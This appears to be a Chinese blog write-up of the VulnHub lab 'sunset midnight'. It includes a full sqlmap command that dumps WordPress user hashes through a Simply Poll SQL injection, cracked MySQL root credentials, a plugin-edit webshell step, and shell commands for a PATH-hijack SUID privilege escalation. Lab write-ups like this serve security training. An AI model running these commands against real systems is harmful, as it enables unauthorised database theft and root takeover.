+++
ShowToc = true
TocOpen = true
title = '0x036 sunset midnight '
date = 2024-10-11T14:25:59+08:00
draft = false
private = true
show_reading_time = true
categories = 'vulnhub'
+++



开机改网卡

# 端口扫描

![](/vulnhub_img/WEBRESOURCE515c39a3dcd4fcc5ce0480c323d5ffdd截图.png)

![](/vulnhub_img/WEBRESOURCEe25f0457757bbefae5bfd634c289321b截图.png)

![](/vulnhub_img/WEBRESOURCEb2710c79e4f6c9659dfad6e683bf179f截图.png)

# 渗透测试

修改hosts

![](/vulnhub_img/WEBRESOURCE9416f3c413dc69ca81bb6da38cb50b53截图.png)

又是一个wordpress：

![](/vulnhub_img/WEBRESOURCEc745f8202c3dbe9ee7c7247705308f13截图.png)

wpscan扫描一下：

用户名admin

![](/vulnhub_img/WEBRESOURCE9510f37f7c02bcd4a296d91df829154f截图.png)

插件：

```
--enumerate
```

![](/vulnhub_img/WEBRESOURCEc7dca05db1ab1a43e4703a6874d66850截图.png)

通过查询Simply Poll的历史漏洞发现sql注入：

![](/vulnhub_img/WEBRESOURCE51825315e324319d8346b1b8c18c9a0d截图.png)

![](/vulnhub_img/WEBRESOURCE848c7a2d74488032fec7fb2914a8da18截图.png)

```
sqlmap -u "http://sunset-midnight/wp-admin/admin-ajax.php" --data="action=spAjaxResults&pollid=2" --threads=10 --random-agent --dbms=mysql --level=5 --risk=3 -D wordpress_db -T wp_users -C user_login,user_pass,ID,display_name,user_nicename,user_email --dump
```

![](/vulnhub_img/WEBRESOURCEcee05cc4df5bc1ee05e20f953efe1863截图.png)

虽然拿到了账号密码，但是好像这个密码无法破解，这样的话，准备改密码：

找了半天hash生成工具，找到这个网站了

[https://www.useotools.com/wordpress-password-hash-generator/output](https://www.useotools.com/wordpress-password-hash-generator/output)

![](/vulnhub_img/WEBRESOURCEcf45a329b9b9f084054046b680c0d714截图.png)

但是遗憾的事情发生了，注入非堆叠注入，没法直接修改数据库内容，只能继续看看数据库里面其他信息了，发现mysql数据库中有一个user表

![](/vulnhub_img/WEBRESOURCEe9741833b28b831db0975a086e66aae7截图.png)

![](/vulnhub_img/WEBRESOURCEac1df8d7902946381479d04729d86e47截图.png)

![](/vulnhub_img/WEBRESOURCE2ac5d6bd7c5cd8d5c0df79e71a4d4e55截图.png)

破解

root/robert

![](/vulnhub_img/WEBRESOURCE0f0829e50053a3c8368b33e58540f079截图.png)

ssh连接失败：

![](/vulnhub_img/WEBRESOURCE67d04ecc7aec34c3c8998e5aba5369c5截图.png)

还有一个端口3306：

连接成功：

![](/vulnhub_img/WEBRESOURCE687afab837885aabd4de5814df67218c截图.png)

再次修改密码：

![](/vulnhub_img/WEBRESOURCE0bec078c9a9cba3a798281ce70fdcf68截图.png)

进入wordpress后台：

这次是修改插件getshell:

![](/vulnhub_img/WEBRESOURCE8e7ff13a609e5e71068f534ba1231521截图.png)

# 提权

麻了，看样子还是得破解那个hash:

![](/vulnhub_img/WEBRESOURCEb6d959bb755f9fba5f5e17b69179532c截图.png)

这边先跑着，然后翻一下敏感文件：

好使：

![](/vulnhub_img/WEBRESOURCE8833e487d9dd9350b33fb02fc3c7d101截图.png)

/** MySQL database username */

define( 'DB_USER', 'jose' );

/** MySQL database password */

define( 'DB_PASSWORD', '645dc5a8871d2a4269d4cbe23f6ae103' );

![](/vulnhub_img/WEBRESOURCE699630602e0acdcee30a258e744f1447截图.png)

user.txt:

![](/vulnhub_img/WEBRESOURCE10e43248bd11cf8477e0d5a992620f0e截图.png)

SUID提权

![](/vulnhub_img/WEBRESOURCE8e4a97fb6834d0df4aa5c824b83e2e82截图.png)

![](/vulnhub_img/WEBRESOURCEc99209e1d543e9319c86f013294305b2截图.png)

修改环境变量：

```
echo "/bin/bash" > service
chmod 777 service
export PATH=/tmp:$PATH
status
```

![](/vulnhub_img/WEBRESOURCEff132dd6bb6f9d63f06022b4b38c678d截图.png)

这里有几个疑问：这里的SUID是非常规的命令，GTFOBins并不能给出好的提权建议，看很多WP都是一笔带过，就说这个可疑，那么这个可疑的判断是只能看经验吗，还是有什么技巧，还是只能挨个看。

这个问题随着对靶场和系统的熟悉会得到解决，前期靠挨个看，后期凭经验。

然后是这个命令，我倒是知道是service ssh status的结果，但是这里又怎么看出来脚本没有使用service命令的绝对路径，导致可以修改环境变量来提权。

![](/vulnhub_img/WEBRESOURCE4054cd8cd544ac1be8d0a863d2daa467截图.png)

针对这个疑问，可以使用strings命令读取status的可识别字符串，就可以解答了。